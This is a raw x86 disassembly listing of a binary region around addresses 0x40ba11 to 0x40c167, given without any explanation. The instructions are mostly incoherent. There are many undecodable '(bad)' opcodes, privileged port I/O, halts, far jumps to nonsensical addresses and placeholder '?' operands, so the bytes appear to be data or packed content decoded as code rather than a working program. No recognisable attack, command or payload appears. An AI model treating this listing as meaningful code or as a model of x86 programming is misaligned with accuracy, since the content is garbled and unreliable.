  40ba11:	pop    ss
  40ba12:	daa    
  40ba13:	out    0x2,eax
  40ba15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba16:	sbb    bh,dl
  40ba18:	and    ebp,esi
  40ba1a:	dec    edi
  40ba1b:	leave  
  40ba1c:	dec    esp
  40ba1d:	jbe    0x40b9ce
  40ba1f:	loope  0x40ba33
  40ba21:	stos   DWORD PTR es:[edi],eax
  40ba22:	add    BYTE PTR [ebp-0x38328ef7],dl
  40ba28:	pop    ebx
  40ba29:	loopne 0x40ba16
  40ba2b:	mov    ds:0x8469d952,al
  40ba30:	sbb    bh,BYTE PTR [ebx+0x2d]
  40ba33:	cmp    eax,0xdd36cf9d
  40ba38:	jg     0x40ba7f
  40ba3a:	mov    ebx,0x6546ce57
  40ba3f:	jmp    0x4f6ea67f
  40ba44:	call   0xaf05:0xd40c831e
  40ba4b:	mov    esp,0x4b9c90ba
  40ba50:	mov    esp,?
  40ba52:	popf   
  40ba53:	sub    al,0x76
  40ba55:	xor    eax,DWORD PTR [ebp-0x7a]
  40ba58:	pusha  
  40ba59:	cmp    edx,edi
  40ba5b:	test   al,0x1
  40ba5d:	pop    edx
  40ba5e:	add    al,0x14
  40ba60:	cpuid  
  40ba62:	cmp    al,0x2d
  40ba64:	aad    0xa6
  40ba66:	cdq    
  40ba67:	add    BYTE PTR [ecx-0x78],dl
  40ba6a:	sub    bh,BYTE PTR [edx]
  40ba6c:	jno    0x40bacf
  40ba6e:	and    al,0xde
  40ba70:	push   esp
  40ba71:	mov    ebx,0xf5aea050
  40ba76:	dec    ebx
  40ba77:	lods   al,BYTE PTR ds:[esi]
  40ba78:	call   0x9494:0x486c0d48
  40ba7f:	scas   eax,DWORD PTR es:[edi]
  40ba80:	pop    eax
  40ba81:	int3   
  40ba82:	push   esp
  40ba83:	pop    edx
  40ba84:	xchg   esi,eax
  40ba85:	mov    cl,0x30
  40ba87:	mov    al,ds:0x58e3a257
  40ba8c:	in     al,dx
  40ba8d:	sub    al,0xb9
  40ba8f:	push   ecx
  40ba90:	cli    
  40ba91:	sub    BYTE PTR [ebx+0x5fdfc959],dh
  40ba97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba98:	out    dx,al
  40ba99:	mov    esp,0xb5e5d220
  40ba9e:	xchg   ecx,eax
  40ba9f:	dec    ebx
  40baa0:	hlt    
  40baa1:	pop    esi
  40baa2:	jle    0x40bacc
  40baa4:	aad    0xc8
  40baa6:	sub    al,0x20
  40baa8:	add    bh,BYTE PTR [ebx-0x52cb59bf]
  40baae:	jle    0x40ba8f
  40bab0:	jl     0x40bb22
  40bab2:	push   cs
  40bab3:	dec    esi
  40bab4:	sbb    eax,0x52d00268
  40bab9:	mov    cl,0x81
  40babb:	cmp    BYTE PTR [esi-0x461ca6e0],0xf6
  40bac2:	pop    ss
  40bac3:	and    DWORD PTR [esi-0x31d1a7aa],ebx
  40bac9:	push   esp
  40baca:	xor    al,0xe9
  40bacc:	(bad)  
  40bacd:	std    
  40bace:	clc    
  40bacf:	lahf   
  40bad0:	xor    ebp,edi
  40bad2:	push   eax
  40bad3:	cmp    al,0x8d
  40bad5:	or     edx,DWORD PTR [ebp+0x30]
  40bad8:	hlt    
  40bad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bada:	mov    edx,0xfef60a46
  40badf:	rcl    DWORD PTR [edx],0x9c
  40bae2:	out    dx,eax
  40bae3:	mov    edx,DWORD PTR [eax-0x4cb4d313]
  40bae9:	test   DWORD PTR [edi-0x1d],ebx
  40baec:	out    dx,eax
  40baed:	pop    ss
  40baee:	in     eax,0x0
  40baf0:	cmc    
  40baf1:	lahf   
  40baf2:	sub    ebp,DWORD PTR [ebx-0x71]
  40baf5:	push   ecx
  40baf6:	mov    ebp,0xca4520b7
  40bafb:	mov    bh,0x5c
  40bafd:	les    ebx,FWORD PTR [edi]
  40baff:	out    0x61,al
  40bb01:	popa   
  40bb02:	std    
  40bb03:	jecxz  0x40baa4
  40bb05:	in     eax,0x5e
  40bb07:	in     al,dx
  40bb08:	sub    ch,BYTE PTR [esi-0x2552e46d]
  40bb0e:	inc    ebp
  40bb0f:	xor    BYTE PTR [edx+0x9],ch
  40bb12:	xchg   esp,eax
  40bb13:	stos   DWORD PTR es:[edi],eax
  40bb14:	loop   0x40bb44
  40bb16:	or     DWORD PTR [edx+0x61],esp
  40bb19:	push   ebx
  40bb1a:	mov    ebp,fs
  40bb1c:	in     eax,dx
  40bb1d:	inc    eax
  40bb1e:	jae    0x40bb4c
  40bb20:	ins    BYTE PTR es:[edi],dx
  40bb21:	(bad)  
  40bb22:	or     eax,0xa493f255
  40bb27:	jmp    0x40bad7
  40bb29:	ror    DWORD PTR [edx],0x62
  40bb2c:	imul   esi,ebp,0xffffffea
  40bb2f:	stos   BYTE PTR es:[edi],al
  40bb30:	xor    al,0xa0
  40bb32:	mov    al,0x20
  40bb34:	inc    edi
  40bb35:	xor    eax,0x1f4f6cec
  40bb3a:	(bad)  
  40bb3c:	(bad)  [eax]
  40bb3e:	outs   dx,DWORD PTR ds:[esi]
  40bb3f:	outs   dx,DWORD PTR ds:[esi]
  40bb40:	int    0x9d
  40bb42:	popa   
  40bb43:	cli    
  40bb44:	fsubr  QWORD PTR [eax+0x53]
  40bb47:	cld    
  40bb48:	rcr    eax,1
  40bb4a:	test   al,0xf6
  40bb4c:	and    al,0x9
  40bb4e:	pop    esp
  40bb4f:	pop    ecx
  40bb51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb52:	jmp    0x40bb36
  40bb54:	jne    0x40bb7e
  40bb56:	mov    WORD PTR [eax],?
  40bb58:	mov    bh,0x31
  40bb5a:	repnz mov esp,0x959683d6
  40bb60:	enter  0xe715,0x80
  40bb64:	pop    eax
  40bb65:	xchg   edi,eax
  40bb66:	in     al,dx
  40bb67:	enter  0x6f73,0xf6
  40bb6b:	cwde   
  40bb6c:	div    DWORD PTR [esi-0x19]
  40bb6f:	popa   
  40bb70:	add    BYTE PTR [edx+0x65],cl
  40bb73:	out    0xbb,eax
  40bb75:	dec    eax
  40bb76:	rol    bh,1
  40bb78:	add    ch,BYTE PTR [edi+ebx*4]
  40bb7b:	aaa    
  40bb7c:	add    eax,0xe3690dff
  40bb81:	push   es
  40bb82:	jmp    0x40bba6
  40bb84:	mov    WORD PTR [ebx-0x49795c93],cs
  40bb8a:	aas    
  40bb8b:	mov    edi,0x72a304d8
  40bb90:	inc    edx
  40bb91:	mov    cl,0x77
  40bb93:	dec    eax
  40bb94:	pop    ebx
  40bb95:	pop    ebx
  40bb96:	mov    ch,0xc6
  40bb98:	pop    edx
  40bb99:	jnp    0x40bbb3
  40bb9b:	lods   eax,DWORD PTR ds:[esi]
  40bb9c:	inc    eax
  40bb9d:	loope  0x40bb60
  40bb9f:	mov    dh,0x3
  40bba1:	or     dl,BYTE PTR ds:0x4a39de0d
  40bba7:	jbe    0x40bc19
  40bba9:	mov    bh,0xb2
  40bbab:	add    DWORD PTR [esi+0x72],ecx
  40bbae:	dec    edi
  40bbaf:	and    dl,BYTE PTR [esi]
  40bbb1:	jge    0x40bb3b
  40bbb3:	cmp    BYTE PTR [ebx],0x53
  40bbb6:	xchg   DWORD PTR [ecx],ebx
  40bbb8:	stos   BYTE PTR es:[edi],al
  40bbb9:	mov    eax,0xae3a6f0c
  40bbbe:	push   cs
  40bbbf:	sub    eax,0x2c472ffa
  40bbc4:	dec    ecx
  40bbc5:	(bad)  
  40bbc6:	pop    ebp
  40bbc7:	int    0x8e
  40bbc9:	jae    0x40bb8e
  40bbcb:	shl    edi,cl
  40bbcd:	setl   BYTE PTR [edx-0x489e8cda]
  40bbd4:	add    DWORD PTR [ecx],ebp
  40bbd6:	inc    esp
  40bbd7:	fsubr  QWORD PTR [eax]
  40bbd9:	cs pop esp
  40bbdb:	(bad)
  40bbde:	aad    0xd1
  40bbe0:	adc    cl,BYTE PTR [esi-0x1]
  40bbe3:	push   eax
  40bbe4:	aaa    
  40bbe5:	cs sub al,0x39
  40bbe8:	jle    0x40bb6e
  40bbea:	jmp    0x1cd62b44
  40bbef:	dec    esp
  40bbf0:	out    dx,eax
  40bbf1:	mov    ecx,DWORD PTR [esi+0x26]
  40bbf4:	mov    DWORD PTR [ecx+0x58],esi
  40bbf7:	add    BYTE PTR [ebx-0x64],ah
  40bbfa:	mov    esi,0xf56d3da4
  40bbff:	scas   al,BYTE PTR es:[edi]
  40bc00:	cli    
  40bc01:	add    DWORD PTR [esi-0xc],ecx
  40bc04:	dec    esi
  40bc05:	or     ecx,esi
  40bc07:	in     eax,0x4f
  40bc09:	jmp    0x40bc71
  40bc0b:	mov    bh,0x3b
  40bc0d:	retf   0xf290
  40bc10:	mov    ebp,0xeecfd2a0
  40bc15:	stc    
  40bc16:	jno    0x40bbc4
  40bc18:	dec    esp
  40bc19:	add    eax,0x9dc3aa6
  40bc1e:	jmp    0x6919a5c0
  40bc23:	mov    ecx,0x207c2374
  40bc28:	in     eax,dx
  40bc29:	xchg   ebp,eax
  40bc2a:	inc    esi
  40bc2b:	and    ebp,DWORD PTR [edi-0x78f7381b]
  40bc31:	inc    ebp
  40bc32:	lds    ebx,FWORD PTR [esi]
  40bc34:	jp     0x40bbcc
  40bc36:	cwde   
  40bc37:	inc    eax
  40bc38:	sti    
  40bc39:	push   ss
  40bc3a:	dec    esi
  40bc3b:	lods   eax,DWORD PTR ds:[esi]
  40bc3c:	(bad)  
  40bc3d:	pop    ebx
  40bc3e:	push   edi
  40bc3f:	push   edx
  40bc40:	or     al,0x1
  40bc42:	ret    0xf52e
  40bc45:	mov    ds:0xa500ad2c,eax
  40bc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc4b:	shl    DWORD PTR [ecx+0x6e2e3a74],0xea
  40bc52:	or     BYTE PTR [eax],cl
  40bc54:	adc    al,bh
  40bc56:	aas    
  40bc57:	push   ds
  40bc58:	xor    bh,BYTE PTR [ecx]
  40bc5a:	inc    ebx
  40bc5b:	push   0xbac3cfe2
  40bc60:	out    dx,al
  40bc61:	add    ecx,edi
  40bc63:	out    0x9c,al
  40bc65:	jno    0x40bc76
  40bc67:	outs   dx,BYTE PTR ds:[esi]
  40bc68:	sti    
  40bc69:	neg    BYTE PTR [eax-0x54]
  40bc6c:	pop    ecx
  40bc6d:	push   ebx
  40bc6e:	sub    BYTE PTR [ebx-0x594e5556],al
  40bc74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc75:	sub    eax,0xa2ab1c62
  40bc7a:	repnz adc DWORD PTR [esi+0x6],edi
  40bc7e:	dec    esi
  40bc7f:	je     0x40bcdc
  40bc81:	jns    0x40bc5b
  40bc83:	lock sub edx,DWORD PTR [esi+0x2d]
  40bc87:	cs push ebx
  40bc89:	push   ebx
  40bc8a:	and    DWORD PTR [edi],eax
  40bc8c:	ror    DWORD PTR [edi],cl
  40bc8e:	xchg   DWORD PTR ds:0x5e58bb26,edx
  40bc94:	in     eax,0x39
  40bc96:	cmp    eax,0x33cd5a30
  40bc9b:	and    eax,0xae91b890
  40bca0:	push   0xffffff8a
  40bca2:	(bad)  
  40bca3:	cmp    bl,BYTE PTR [edi-0xa7b8d2e]
  40bca9:	pop    esi
  40bcaa:	sub    ebx,edi
  40bcac:	cmp    ebx,edx
  40bcae:	mov    edx,DWORD PTR [ebp-0x38]
  40bcb1:	jbe    0x40bcba
  40bcb7:	mov    edx,DWORD PTR [ebp-0x3c]
  40bcba:	mov    edi,DWORD PTR [ebp-0x4]
  40bcbd:	xor    edi,eax
  40bcbf:	xor    edx,eax
  40bcc1:	jmp    0x40c0d8
  40bcc6:	test   DWORD PTR [ebp-0x48],ecx
  40bcc9:	rol    BYTE PTR [eax-0x33],0x8d
  40bccd:	dec    ebp
  40bcce:	pop    ecx
  40bccf:	repz ror ebx,cl
  40bcd2:	mov    edi,0xe443eb56
  40bcd7:	mov    ?,WORD PTR [esi+0x7e]
  40bcda:	jo     0x40bd55
  40bcdc:	jle    0x40bd5c
  40bcde:	outs   dx,DWORD PTR ds:[esi]
  40bcdf:	or     eax,0xc9147e7e
  40bce4:	xor    ebp,DWORD PTR [ebx+0x74]
  40bce7:	xchg   ch,dh
  40bce9:	shr    DWORD PTR [eax-0x50e9ca99],1
  40bcef:	retf   
  40bcf0:	lock popa 
  40bcf2:	repz mov bl,0xc5
  40bcf5:	in     al,0xb0
  40bcf7:	retf   0x76f6
  40bcfa:	jmp    0x40bd13
  40bcfc:	cmp    edx,edi
  40bcfe:	pop    DWORD PTR [esi-0xf972d7b]
  40bd04:	inc    esi
  40bd05:	sub    ah,BYTE PTR [ebp*2+0x76be1bc5]
  40bd0c:	loop   0x40bd0e
  40bd0e:	jp     0x40bd82
  40bd10:	sar    eax,1
  40bd12:	imul   edi,DWORD PTR [ebx+eiz*4-0x328bab54],0xffffff9f
  40bd1a:	mov    al,0xfe
  40bd1c:	adc    eax,0xc7bb5e57
  40bd21:	inc    esp
  40bd22:	adc    DWORD PTR [ebx+0x5c7a336e],0xffffff98
  40bd29:	sbb    ecx,DWORD PTR [esi+0x3a]
  40bd2c:	dec    ebp
  40bd2d:	xchg   ecx,eax
  40bd2e:	fistp  WORD PTR [ebx+0x41]
  40bd31:	cwde   
  40bd32:	aaa    
  40bd33:	push   0xb
  40bd35:	rcr    BYTE PTR [ebp-0x5d],0x29
  40bd39:	jo     0x40bdab
  40bd3b:	cdq    
  40bd3c:	or     eax,0x743baf0d
  40bd41:	ins    DWORD PTR es:[edi],dx
  40bd42:	push   esi
  40bd43:	jmp    0xb900a56c
  40bd48:	test   DWORD PTR [edi-0x38],edx
  40bd4b:	cli    
  40bd4c:	sub    eax,0x82d4ea28
  40bd51:	arpl   WORD PTR [ecx+0x7faf9fff],bx
  40bd57:	mov    ecx,0xdbfcba17
  40bd5c:	(bad)  
  40bd5e:	push   edx
  40bd5f:	popa   
  40bd60:	mov    esi,0x6e5d5a95
  40bd65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd66:	jl     0x40bd31
  40bd68:	sbb    edi,esi
  40bd6a:	add    cl,BYTE PTR [edx-0x11618b03]
  40bd70:	or     eax,DWORD PTR [ebp-0x252b18cd]
  40bd76:	add    esi,DWORD PTR [eax+eax*1-0x648e83d9]
  40bd7d:	add    al,0x5f
  40bd7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd80:	cdq    
  40bd81:	outs   dx,BYTE PTR ds:[esi]
  40bd82:	popf   
  40bd83:	push   es
  40bd84:	mov    ah,BYTE PTR [edx]
  40bd86:	in     eax,dx
  40bd87:	int3   
  40bd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd89:	mov    dh,0x67
  40bd8b:	jo     0x40bd0d
  40bd8d:	xor    eax,0xb4cad07b
  40bd92:	cld    
  40bd93:	jmp    FWORD PTR [bx-0x61a0]
  40bd98:	push   edi
  40bd99:	xor    eax,0x12ab7a7
  40bd9e:	aas    
  40bd9f:	mov    ebp,0x931d1a7
  40bda4:	adc    al,0xad
  40bda6:	mov    ds:0x9ca4e418,al
  40bdab:	jmp    0x4878:0xef953775
  40bdb2:	jae    0x40bdea
  40bdb4:	dec    ecx
  40bdb5:	ins    DWORD PTR es:[edi],dx
  40bdb6:	jmp    0xa8fc:0x12748663
  40bdbd:	sub    DWORD PTR [ecx-0x632d19de],eax
  40bdc3:	push   ebx
  40bdc4:	pop    edi
  40bdc5:	pop    es
  40bdc6:	mov    esp,0x5c657067
  40bdcb:	fdiv   QWORD PTR [edx]
  40bdcd:	and    bh,BYTE PTR [edi]
  40bdcf:	gs pop edx
  40bdd1:	aas    
  40bdd2:	xor    BYTE PTR [esp+edx*2-0x12],bl
  40bdd6:	jbe    0x40bd9d
  40bdd8:	(bad)  
  40bdd9:	push   ecx
  40bdda:	mov    WORD PTR [eax+0x69],fs
  40bddd:	mov    esi,0xe2cd78bd
  40bde2:	nop
  40bde3:	sub    BYTE PTR [ecx],dl
  40bde5:	popa   
  40bde6:	sbb    edx,DWORD PTR [eax]
  40bde8:	cli    
  40bde9:	add    DWORD PTR [edx-0x6d40179a],0xffffff9d
  40bdf0:	xchg   edx,eax
  40bdf1:	repz mov cs,esp
  40bdf4:	std    
  40bdf5:	lods   eax,DWORD PTR ds:[esi]
  40bdf6:	push   ebp
  40bdf7:	outs   dx,DWORD PTR ds:[esi]
  40bdf8:	add    eax,0x7354ce8d
  40bdfd:	ret    
  40bdfe:	dec    ecx
  40bdff:	inc    ebp
  40be00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be01:	xor    eax,0xc7f52232
  40be06:	cwde   
  40be07:	fwait
  40be08:	aad    0xe4
  40be0a:	loop   0x40bd8e
  40be0c:	not    BYTE PTR ds:0xaa87
  40be11:	ja     0x40bdaf
  40be13:	adc    dl,BYTE PTR [esi+0x44a867a0]
  40be19:	test   BYTE PTR [eax+0x18507b20],al
  40be1f:	push   cs
  40be20:	lds    esp,FWORD PTR [ebx+ecx*8+0x468de9aa]
  40be27:	push   ds
  40be28:	inc    esi
  40be29:	xlat   BYTE PTR ds:[ebx]
  40be2a:	xor    eax,0x4c8da8cb
  40be2f:	jno    0x40be65
  40be31:	xchg   ecx,eax
  40be32:	stos   DWORD PTR es:[edi],eax
  40be33:	cli    
  40be34:	mov    ebx,0x57a982f7
  40be39:	ins    BYTE PTR es:[edi],dx
  40be3a:	inc    esi
  40be3b:	push   esp
  40be3c:	fsubr  QWORD PTR [ecx-0x42583da5]
  40be42:	mov    cl,0x9
  40be44:	out    0xa0,eax
  40be46:	pusha  
  40be47:	loope  0x40be48
  40be49:	mov    bl,0x89
  40be4b:	pop    ss
  40be4c:	push   edi
  40be4d:	sbb    BYTE PTR [ecx+edx*2-0x20],ch
  40be51:	les    edx,FWORD PTR [edx]
  40be53:	mov    esi,0x6ba8e88a
  40be58:	fs jmp 0x1103:0x2c202b75
  40be60:	jl     0x40bde4
  40be62:	imul   edi,DWORD PTR [edx],0x85130e04
  40be68:	dec    esi
  40be69:	out    dx,al
  40be6a:	dec    ecx
  40be6b:	icebp  
  40be6c:	dec    eax
  40be6d:	push   esp
  40be6e:	xchg   esp,eax
  40be6f:	cmp    al,bl
  40be71:	test   edx,0xa40c0aa0
  40be77:	imul   BYTE PTR [ebx]
  40be79:	test   BYTE PTR ss:[ecx],0x4
  40be7d:	mov    eax,0x790db84c
  40be82:	add    eax,0x414f3f35
  40be87:	stos   BYTE PTR es:[edi],al
  40be88:	nop
  40be89:	gs pop esi
  40be8b:	fdecstp 
  40be8d:	adc    eax,0x9793db4
  40be92:	int3   
  40be93:	pusha  
  40be94:	ss add esp,esp
  40be97:	fidiv  WORD PTR [ecx+edx*2]
  40be9a:	imul   ecx,edi,0xfffffff6
  40be9d:	jo     0x40be23
  40be9f:	iret   
  40bea0:	jmp    0x40be93
  40bea2:	push   ebx
  40bea3:	xchg   ecx,eax
  40bea4:	mov    bh,0x8a
  40bea6:	ja     0x40be70
  40bea8:	into   
  40bea9:	jecxz  0x40bf0f
  40beab:	test   al,0x67
  40bead:	idiv   BYTE PTR [ebp+0x71]
  40beb0:	add    al,0x9b
  40beb2:	mov    edx,DWORD PTR [ecx+0x3ca0f646]
  40beb8:	fisubr DWORD PTR ds:0xec8c1202
  40bebe:	pop    eax
  40bebf:	mov    dh,BYTE PTR [eax+0x33]
  40bec2:	repnz add eax,DWORD PTR ss:[ecx+0x199f2bb0]
  40beca:	daa    
  40becb:	inc    ebp
  40becc:	into   
  40becd:	lea    edx,[eax-0x75]
  40bed0:	imul   ecx,DWORD PTR [eax+0x69],0xf2943826
  40bed7:	adc    edi,DWORD PTR [ecx]
  40bed9:	jbe    0x40bea9
  40bedb:	out    dx,eax
  40bedc:	push   es
  40bedd:	push   0xc
  40bedf:	mov    eax,ds:0xcb36cd96
  40bee4:	outs   dx,BYTE PTR ds:[esi]
  40bee5:	push   0x7378daa4
  40beea:	jb     0x40bedf
  40beec:	pop    ebp
  40beed:	xor    bh,bh
  40beef:	or     ah,BYTE PTR [ecx]
  40bef1:	imul   ecx,ecx,0xffffffac
  40bef4:	xchg   esp,eax
  40bef5:	leave  
  40bef6:	iret   
  40bef7:	mov    dl,ah
  40bef9:	dec    eax
  40befa:	leave  
  40befb:	loop   0x40bf4c
  40befd:	pop    ebp
  40befe:	push   esi
  40beff:	(bad)  
  40bf01:	(bad)  
  40bf02:	fwait
  40bf03:	mov    al,0xd4
  40bf05:	inc    esp
  40bf06:	cmp    dl,bl
  40bf08:	xchg   edx,eax
  40bf09:	pop    edi
  40bf0a:	xor    ch,BYTE PTR [edi+0x52]
  40bf0d:	push   0x7e
  40bf0f:	in     eax,0x2e
  40bf11:	adc    ebx,ebp
  40bf13:	test   BYTE PTR [ecx],bl
  40bf15:	pushf  
  40bf16:	lods   eax,DWORD PTR ds:[esi]
  40bf17:	fwait
  40bf18:	jne    0x40beaf
  40bf1a:	retf   
  40bf1b:	cmp    eax,0xcb1cc5c3
  40bf20:	dec    edx
  40bf21:	cs push esp
  40bf23:	mov    ecx,0xf1a76565
  40bf28:	out    dx,eax
  40bf29:	push   esi
  40bf2a:	jmp    0xe0a982d2
  40bf2f:	mov    DWORD PTR [edi+edx*2],eax
  40bf32:	mov    ds:0x11b6cfdf,eax
  40bf37:	test   DWORD PTR [ecx+edi*4-0x48],0x74b3d1ff
  40bf3f:	ret    0xf39e
  40bf42:	pushf  
  40bf43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf44:	push   es
  40bf45:	(bad)  
  40bf46:	fistp  WORD PTR [edi+0x31def4c9]
  40bf4c:	mov    esp,0xaae9c550
  40bf51:	push   esp
  40bf52:	mov    ebp,0xc590b305
  40bf57:	ret    
  40bf58:	daa    
  40bf59:	mov    ebx,0x1ab357a9
  40bf5e:	faddp  st(5),st
  40bf60:	scas   eax,DWORD PTR es:[edi]
  40bf61:	add    DWORD PTR [eax-0x2b6d39a7],edi
  40bf67:	cmp    eax,0x8b946428
  40bf6c:	call   0x323d:0xf6c2ed25
  40bf73:	pop    edx
  40bf74:	sub    cl,bh
  40bf76:	and    DWORD PTR [ebx+0x3f0ef3ca],edx
  40bf7c:	xor    esi,DWORD PTR [ebp+0x2b]
  40bf7f:	jmp    0x873b:0x7145f134
  40bf86:	addr16 cmp eax,0x97dbc3ed
  40bf8c:	ret    
  40bf8d:	xor    cl,BYTE PTR [edx+0x4c09f464]
  40bf93:	sub    eax,0xd1c220da
  40bf98:	(bad)  
  40bf99:	hlt    
  40bf9a:	jl     0x40bfff
  40bf9c:	sbb    bh,BYTE PTR [ebp+0x57]
  40bf9f:	rcl    DWORD PTR [esi+esi*4-0x4a],cl
  40bfa3:	nop
  40bfa4:	jmp    0x1d9a:0x1c908c96
  40bfab:	adc    DWORD PTR [edx-0x1c624425],ebp
  40bfb1:	imul   ebp,esp,0x3832eada
  40bfb7:	or     ebp,eax
  40bfb9:	sar    dh,1
  40bfbb:	(bad)  
  40bfbd:	into   
  40bfbe:	cmp    dh,BYTE PTR [edx]
  40bfc0:	adc    BYTE PTR [esi-0x1c7d683d],bl
  40bfc6:	lods   al,BYTE PTR ds:[esi]
  40bfc7:	xchg   esi,eax
  40bfc8:	and    edx,DWORD PTR [edx+0x1cc883bd]
  40bfce:	daa    
  40bfcf:	in     al,0xbf
  40bfd1:	fbstp  TBYTE PTR [bx+si+0x612d]
  40bfd6:	fistp  WORD PTR [eax-0x7f]
  40bfd9:	xchg   esi,eax
  40bfda:	and    DWORD PTR [ebx-0x5b],ecx
  40bfdd:	pop    ds
  40bfde:	jl     0x40c005
  40bfe0:	push   cs
  40bfe1:	jmp    ecx
  40bfe3:	inc    ebp
  40bfe4:	loop   0x40c04b
  40bfe6:	inc    esp
  40bfe7:	cli    
  40bfe8:	xchg   DWORD PTR [edi+0x11abfa2e],ecx
  40bfee:	outs   dx,BYTE PTR ds:[esi]
  40bfef:	pop    edx
  40bff0:	and    dl,BYTE PTR [ebx+ecx*1+0x22457a4f]
  40bff7:	mov    eax,ds:0xb192f15d
  40bffc:	rcr    DWORD PTR [eax-0x3388bed4],cl
  40c002:	dec    edx
  40c003:	cdq    
  40c004:	mov    eax,0x87db5dc6
  40c009:	pop    edi
  40c00a:	cli    
  40c00b:	mov    bh,0x63
  40c00d:	sbb    eax,0x225ec774
  40c012:	adc    eax,0xddd1beb3
  40c017:	call   0x32fca815
  40c01c:	xor    ah,0x3b
  40c01f:	es shl ah,cl
  40c022:	pop    ebx
  40c023:	leave  
  40c024:	(bad)  
  40c026:	stc    
  40c027:	push   edi
  40c028:	mov    bh,0x15
  40c02a:	mov    eax,ds:0x81dd49a
  40c02f:	repz and eax,0x7d0a9c15
  40c035:	sub    eax,0x8506fe71
  40c03a:	mov    edi,0xd9b2a2c6
  40c03f:	mov    eax,DWORD PTR [edi+0x717dbca6]
  40c045:	sbb    DWORD PTR [ecx+0x3c],esp
  40c048:	jno    0x40c053
  40c04a:	push   es
  40c04b:	mov    al,0xe8
  40c04d:	inc    eax
  40c04e:	es aad 0x6f
  40c051:	jmp    0x40c0a3
  40c053:	dec    esp
  40c054:	dec    edx
  40c055:	sbb    ah,cl
  40c057:	imul   edi,DWORD PTR [eax-0x46],0xec3676ac
  40c05e:	adc    al,BYTE PTR [ebp+0x2]
  40c061:	xchg   ebx,eax
  40c062:	dec    edi
  40c063:	cdq    
  40c064:	mov    BYTE PTR [eax],al
  40c066:	ret    0xbc72
  40c069:	pop    esp
  40c06a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40c06c:	into   
  40c06d:	pop    edi
  40c06e:	sub    BYTE PTR [ecx-0x48],0xd2
  40c072:	push   0xffffffd8
  40c074:	push   eax
  40c075:	aad    0x4e
  40c077:	inc    esi
  40c078:	lea    edi,[esi-0x55e2357c]
  40c07e:	add    al,0x4c
  40c080:	jo     0x40c0e6
  40c082:	(bad)  
  40c083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c084:	shl    DWORD PTR [edx],cl
  40c086:	ja     0x40c0b9
  40c088:	xchg   ebp,eax
  40c089:	sub    eax,0x3400a27a
  40c08e:	dec    ebp
  40c08f:	add    bl,ch
  40c091:	test   DWORD PTR [ecx],eax
  40c093:	dec    ebx
  40c094:	dec    edi
  40c095:	mov    ebp,0x1403e197
  40c09a:	mov    bh,0xdb
  40c09c:	cmp    dh,BYTE PTR [ecx]
  40c09e:	arpl   WORD PTR ds:[eax],dx
  40c0a1:	es and al,0x1
  40c0a4:	outs   dx,DWORD PTR ds:[esi]
  40c0a5:	adc    al,0xc8
  40c0a7:	ret    
  40c0a8:	add    ebp,edi
  40c0aa:	cdq    
  40c0ab:	xlat   BYTE PTR ds:[ebx]
  40c0ac:	pop    ecx
  40c0ad:	or     BYTE PTR [ebp-0x4],ah
  40c0b0:	nop
  40c0b1:	out    0x5b,eax
  40c0b3:	and    al,0xde
  40c0b5:	call   0x4886732a
  40c0ba:	cmp    ch,BYTE PTR [ebx+esi*1-0x1f]
  40c0be:	mov    dh,BYTE PTR [ecx+0x7e047898]
  40c0c4:	icebp  
  40c0c5:	test   al,0x78
  40c0c7:	les    ecx,FWORD PTR [edx-0x5d]
  40c0ca:	fadd   DWORD PTR [ebp+0xfd91402]
  40c0d0:	ins    BYTE PTR es:[edi],dx
  40c0d1:	cwde   
  40c0d2:	push   esi
  40c0d3:	jns    0x40c105
  40c0d5:	mov    esp,0xf90312f3
  40c0da:	add    edx,ecx
  40c0dc:	jmp    0x40c4f3
  40c0e1:	cmp    eax,0x7dcf74e8
  40c0e6:	dec    ebx
  40c0e7:	mov    ebp,0xd527fffc
  40c0ec:	ror    cl,1
  40c0ee:	fldenv [edx+0x7e8ade37]
  40c0f4:	jle    0x40c166
  40c0f6:	jns    0x40c176
  40c0f8:	jle    0x40c0c0
  40c0fa:	sbb    DWORD PTR [ebx],edx
  40c0fc:	xor    al,BYTE PTR [esi-0x7b]
  40c0ff:	leave  
  40c100:	add    esi,DWORD PTR [ebx+0x23]
  40c103:	jecxz  0x40c17d
  40c105:	or     esi,ebx
  40c107:	xchg   DWORD PTR [ebx-0x7a],ecx
  40c10a:	repz inc edi
  40c10c:	out    0x4d,eax
  40c10e:	xchg   BYTE PTR [esi+edx*2+0x7ccb061a],ah
  40c115:	icebp  
  40c116:	and    al,0x6e
  40c118:	and    eax,0x7a8649a8
  40c11d:	mov    eax,ds:0x3df8d2cc
  40c122:	or     dh,BYTE PTR [ebx+0x794dca6e]
  40c128:	push   edx
  40c129:	leave  
  40c12a:	test   DWORD PTR [ebp+ecx*4-0x55],esp
  40c12e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c12f:	in     eax,0xf1
  40c131:	push   ebp
  40c132:	ret    0x2dc2
  40c135:	dec    esi
  40c136:	jb     0x40c139
  40c138:	mov    bh,BYTE PTR [ebp+0x555586c2]
  40c13e:	pop    ebp
  40c13f:	xor    al,0xe7
  40c141:	xor    ah,BYTE PTR [esi]
  40c143:	pop    es
  40c144:	stos   BYTE PTR es:[edi],al
  40c145:	xchg   ebx,eax
  40c146:	mov    al,ds:0xcae50ae3
  40c14b:	xchg   esp,eax
  40c14c:	sub    edx,DWORD PTR [edx+0x5c]
  40c14f:	ds sbb al,0x41
  40c152:	add    cl,al
  40c154:	mov    al,ds:0x52aadf9f
  40c159:	out    dx,al
  40c15a:	dec    ecx
  40c15b:	sbb    bl,BYTE PTR [esi+0x70]
  40c15e:	sbb    eax,0x3180de50
  40c163:	jle    0x40c105
  40c165:	aaa    
  40c166:	outs   dx,BYTE PTR ds:[esi]
  40c167:	int3   
